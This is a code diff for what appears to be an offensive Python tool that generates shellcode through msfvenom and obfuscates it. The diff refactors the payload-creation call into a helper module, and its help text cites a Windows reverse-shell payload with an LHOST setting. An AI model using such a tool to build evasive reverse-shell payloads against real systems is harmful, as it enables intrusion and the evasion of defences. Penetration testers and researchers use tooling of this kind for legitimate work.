@@ -1,8 +1,9 @@
 import argparse
 import os
-import subprocess
+#import subprocess
 
 import utils.assist as assist
+import utils.msf as msf
 import utils.shellcode as sc
 
 msfvenom_path = "c:\\metasploit-framework\\bin\\msfvenom.bat"
@@ -24,7 +25,7 @@ def main():
   print(f"{nstate.HEADER}___] |  | |___ | \\| |___ |__| |__/ |___{nstate.ENDC}")
   print(f"{nstate.HEADER}Version 0.2 by psycore8{nstate.ENDC}")
   parser = argparse.ArgumentParser(description="create and obfuscate shellcodes")
-  #parser.add_argument("-mods", "--mod_shellcode", choices=["msfvenom","file"],               help="Shellcode module: msfvenom, file")
+  parser.add_argument("mod_shellcode", type=str, choices=["msfvenom","file"],               help="Shellcode module: msfvenom, file")
   parser.add_argument("-p", "--payload",                        help="Payload to use e.g. windows/shell_reverse_tcp")
  #parser.add_argument("-i", "--inputfile",                      help="don't create a payload from msfvenom, use an existing shellcode instead") 
   parser.add_argument("-a1","--arg1",                           help="argument1 for payload e.g. LHOST=127.0.0.1")
@@ -54,15 +55,10 @@ def main():
   #else:
     #print("[+] Please provide both --shellcode and --key arguments.")
     #exit()
-  
-  h = assist.helper
-  file_name = str(h.GenerateFileName())
-  print(f"{nstate.OKGREEN} filename will be: "+file_name)
-  
+ 
   print(f"{nstate.OKBLUE} create payload")
-  result = subprocess.run([msfvenom_path, "-p", payload, arg1, arg2, "-e", "generic/none", "--format", "raw", "-o", file_name])
-  #if args.verbose:
-    #print(result.stdout)
+  cs = msf.msfvenom
+  file_name = cs.CreateShellcode(msfvenom_path, payload, arg1, arg2)
 
   path = "./"+file_name
   cf = os.path.isfile(path)
